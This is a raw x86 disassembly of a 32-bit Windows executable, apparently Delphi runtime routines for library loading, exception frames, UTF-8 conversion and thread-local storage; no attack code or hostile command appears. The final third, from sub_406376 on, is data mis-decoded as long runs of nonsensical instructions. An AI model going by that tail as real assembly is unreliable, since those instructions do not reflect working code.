lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_4059c8
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_40270c
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_40270c
jmp r-xdata
sub_405a28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405a63
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405a94
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405af8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405a28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405aff
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405b1c
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405b48
test edx edx
je sub_405b04
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402848
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405bec
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_401324
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405c14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405cf0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405e28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405ec7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404164
mov eax ebx
xor edx edx
call sub_4049bc
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ece
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax ebx
call sub_4049b0
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4047b0
mov eax ebx
call sub_4049b0
push eax
mov eax [ ebp - 0x4 ]
call sub_404424
inc eax
push eax
mov eax ebx
call sub_4049a0
push eax
mov eax [ ebp - 0x4 ]
call sub_404624
pop ecx
pop edx
call sub_405c14
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404164
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4047b0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4041b8
sub_405ed4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405f6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404844
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f72
lea eax [ ebp - 0x4 ]
call sub_404844
retn
mov eax ebx
call sub_404424
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404a8c
mov eax ebx
call sub_404424
push eax
mov eax [ ebp - 0x4 ]
call sub_4049b0
inc eax
push eax
mov eax ebx
call sub_404624
push eax
mov eax [ ebp - 0x4 ]
call sub_4049a0
pop ecx
pop edx
call sub_405cf0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404844
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404a8c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404880
sub_405f78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405fbb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404990
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405e28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405fc2
lea eax [ ebp - 0x4 ]
call sub_404844
retn
sub_405fc8
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40435c
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405534
push eax
call sub_4012bc
mov ecx eax
mov edx esp
mov eax esi
call sub_404254
jmp r-xdata
sub_406020
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_406086
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401284
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4043d4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402d44
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40608d
lea eax [ ebp - 0x10 ]
call sub_404164
retn
xor ebx ebx
sub_406094
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4060de
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4060e5
retn
mov eax rw-data
call sub_402bbc
mov eax rw-data
call sub_402bbc
mov eax rw-data
call sub_402bbc
call sub_401af0
sub_4060e8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_405028
call sub_4031a8
test al al
je r-xdata
call sub_40329c
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40133c
mov [ rw-data ] eax
call sub_401334
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_4031d8
call sub_4012ac
call sub_406020
mov [ rw-data ] eax
call sub_401334
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_4012ac
call sub_406020
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40132c
mov [ rw-data ] eax
sub_4061f0
push ebx
call sub_4061e8
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_4061dc
test eax eax
jne r-xdata
mov eax 0xe2
call sub_4040d4
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_4040d4
sub_406234
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_4061f0
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_406280
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_4061bc
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_406274
mov edx rw-data
mov eax ebx
call sub_403e28
pop ebx
retn
sub_4062c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4062e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4062f0
retn
sub_406320
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_40633c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406361
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406368
retn
sub_406376
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
je r-xdata
outsd
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
push ebx
dec eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec eax
add [ ebx + 0x2825ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x1c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x1825ffc0 ] cl
push ebx
sar bh 0x25
and [ ebx + 0x48 ] dl
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec eax
add [ ebx + 0x1425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x1025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0xc25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x25ffc0 ] cl
push ebx
dec eax
add [ ebx - 0x3da0040 ] cl
push edx
dec eax
add [ ebx - 0x7da0040 ] cl
push edx
dec eax
add [ ebx - 0xbda0040 ] cl
push edx
dec eax
add [ ebx - 0xfda0040 ] cl
push edx
dec eax
add [ ebx - 0x13da0040 ] cl
push edx
dec eax
add [ ebx - 0x17da0040 ] cl
push edx
dec eax
add [ ebx - 0x1bda0040 ] cl
push edx
dec eax
add [ ebx - 0x1fda0040 ] cl
push edx
dec eax
add [ ebx - 0x23da0040 ] cl
push edx
dec eax
add [ ebx - 0x27da0040 ] cl
push edx
dec eax
add [ ebx - 0x2bda0040 ] cl
push edx
dec eax
add [ ebx - 0x2fda0040 ] cl
push edx
dec eax
add [ ebx - 0x33da0040 ] cl
push edx
dec eax
add [ ebx - 0x37da0040 ] cl
push edx
dec eax
add [ ebx - 0x3bda0040 ] cl
push edx
dec eax
add [ ebx - 0x3fda0040 ] cl
push edx
dec eax
add [ ebx - 0x43da0040 ] cl
push edx
dec eax
add [ ebx - 0x47da0040 ] cl
push edx
dec eax
add [ ebx - 0x4bda0040 ] cl
push edx
dec eax
add [ ebx - 0x4fda0040 ] cl
push edx
dec eax
add [ ebx - 0x53da0040 ] cl
push edx
dec eax
add [ ebx - 0x57da0040 ] cl
push edx
dec eax
add [ ebx - 0x5bda0040 ] cl
push edx
dec eax
add [ ebx - 0x5fda0040 ] cl
push edx
dec eax
add [ ebx - 0x63da0040 ] cl
push edx
dec eax
add [ ebx - 0x67da0040 ] cl
push edx
dec eax
add [ ebx - 0x6bda0040 ] cl
push edx
dec eax
add [ ebx - 0x6fda0040 ] cl
push edx
dec eax
add [ ebx - 0x73da0040 ] cl
push edx
dec eax
add [ ebx - 0x77da0040 ] cl
push edx
dec eax
add [ ebx - 0x7bda0040 ] cl
push edx
dec eax
add [ ebx - 0x7fda0040 ] cl
push edx
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x7825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x7425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x7025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x6825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x6425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x6025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x5825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x5425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x5025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x4825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x4425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x4025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x3825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x3425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x3025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x2825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x2425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x2025ffc0 ] cl
push edx
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x1825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x1425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x1025ffc0 ] cl
push edx
dec eax
add [ ebx + 0xc25ffc0 ] cl
push edx
dec eax
add [ ebx + 0x825ffc0 ] cl
push edx
dec eax
add [ ebx + 0x425ffc0 ] cl
push edx
dec eax
add [ ebx + 0x4425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x4025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x3825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x3425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x3025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x2825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x2425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x2025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x1825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x1425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x1025ffc0 ] cl
push esp
dec eax
add [ ebx + 0xc25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x25ffc0 ] cl
push esp
dec eax
add [ ebx - 0x3da0040 ] cl
push ebx
dec eax
add [ ebx - 0x7da0040 ] cl
push ebx
dec eax
add [ ebx - 0xbda0040 ] cl
push ebx
dec eax
add [ ebx - 0xfda0040 ] cl
push ebx
dec eax
add [ ebx - 0x13da0040 ] cl
push ebx
dec eax
add [ ebx - 0x17da0040 ] cl
push ebx
dec eax
add [ ebx - 0x1bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x1fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x23da0040 ] cl
push ebx
dec eax
add [ ebx - 0x27da0040 ] cl
push ebx
dec eax
add [ ebx - 0x2bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x2fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x33da0040 ] cl
push ebx
dec eax
add [ ebx - 0x37da0040 ] cl
push ebx
dec eax
add [ ebx - 0x3bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x3fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x43da0040 ] cl
push ebx
dec eax
add [ ebx - 0x47da0040 ] cl
push ebx
dec eax
add [ ebx - 0x4bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x4fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x53da0040 ] cl
push ebx
dec eax
add [ ebx - 0x57da0040 ] cl
push ebx
dec eax
add [ ebx - 0x5bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x5fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x63da0040 ] cl
push ebx
dec eax
add [ ebx - 0x67da0040 ] cl
push ebx
dec eax
add [ ebx - 0x6bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x6fda0040 ] cl
push ebx
dec eax
add [ ebx - 0x73da0040 ] cl
push ebx
dec eax
add [ ebx - 0x77da0040 ] cl
push ebx
dec eax
add [ ebx - 0x7bda0040 ] cl
push ebx
dec eax
add [ ebx - 0x7fda0040 ] cl
push ebx
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x7825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x7425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x7025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x6825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x6425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x6025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x5825ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x5425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x5025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push ebx
dec eax
add [ ebx - 0x33da0040 ] cl
push esi
dec eax
add [ ebx - 0x37da0040 ] cl
push esi
dec eax
add [ ebx - 0x3fda0040 ] cl
push esi
dec eax
add [ ebx - 0x47da0040 ] cl
push esi
dec eax
add [ ebx - 0x4bda0040 ] cl
push esi
dec eax
add [ ebx - 0x4fda0040 ] cl
push esi
dec eax
add [ ebx - 0x53da0040 ] cl
push esi
dec eax
add [ ebx - 0x43da0040 ] cl
push esi
dec eax
add [ ebx - 0x3bda0040 ] cl
push esi
dec eax
add [ ebx - 0x57da0040 ] cl
push esi
dec eax
add [ ebx - 0x5bda0040 ] cl
push esi
dec eax
add [ ebx - 0x5fda0040 ] cl
push esi
dec eax
add [ ebx - 0x63da0040 ] cl
push esi
dec eax
add [ ebx - 0x67da0040 ] cl
push esi
dec eax
add [ ebx - 0x6bda0040 ] cl
push esi
dec eax
add [ ebx - 0x6fda0040 ] cl
push esi
dec eax
add [ ebx - 0x73da0040 ] cl
push esi
dec eax
add [ ebx - 0x77da0040 ] cl
push esi
dec eax
add [ ebx - 0x7bda0040 ] cl
push esi
dec eax
add [ ebx - 0x7fda0040 ] cl
push esi
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x7825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x7425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x7025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x6825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x6425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x6025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x5825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x5425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x5025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x4825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x4425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x4025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x3825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x3425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x3025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x2825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x2425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x2025ffc0 ] cl
push esi
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x1825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x1425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x1025ffc0 ] cl
push esi
dec eax
add [ ebx + 0xc25ffc0 ] cl
push esi
dec eax
add [ ebx + 0x825ffc0 ] cl
push esi
dec eax
add [ ebx + 0x425ffc0 ] cl
push esi
dec eax
add [ ebx + 0x25ffc0 ] cl
push esi
dec eax
add [ ebx - 0x3da0040 ] cl
push ebp
dec eax
add [ ebx - 0x7da0040 ] cl
push ebp
dec eax
add [ ebx - 0xbda0040 ] cl
push ebp
dec eax
add [ ebx - 0xfda0040 ] cl
push ebp
dec eax
add [ ebx - 0x13da0040 ] cl
push ebp
dec eax
add [ ebx - 0x17da0040 ] cl
push ebp
dec eax
add [ ebx - 0x1bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x1fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x23da0040 ] cl
push ebp
dec eax
add [ ebx - 0x27da0040 ] cl
push ebp
dec eax
add [ ebx - 0x2bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x2fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x33da0040 ] cl
push ebp
dec eax
add [ ebx - 0x37da0040 ] cl
push ebp
dec eax
add [ ebx - 0x3bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x3fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x43da0040 ] cl
push ebp
dec eax
add [ ebx - 0x47da0040 ] cl
push ebp
dec eax
add [ ebx - 0x4bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x4fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x53da0040 ] cl
push ebp
dec eax
add [ ebx - 0x57da0040 ] cl
push ebp
dec eax
add [ ebx - 0x5bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x5fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x63da0040 ] cl
push ebp
dec eax
add [ ebx - 0x67da0040 ] cl
push ebp
dec eax
add [ ebx - 0x6bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x6fda0040 ] cl
push ebp
dec eax
add [ ebx - 0x73da0040 ] cl
push ebp
dec eax
add [ ebx - 0x77da0040 ] cl
push ebp
dec eax
add [ ebx - 0x4bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x7bda0040 ] cl
push ebp
dec eax
add [ ebx - 0x7fda0040 ] cl
push ebp
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x7825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x7425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x7025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x7025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x6825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x6425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x6025ffc0 ] cl
push ebp
dec eax
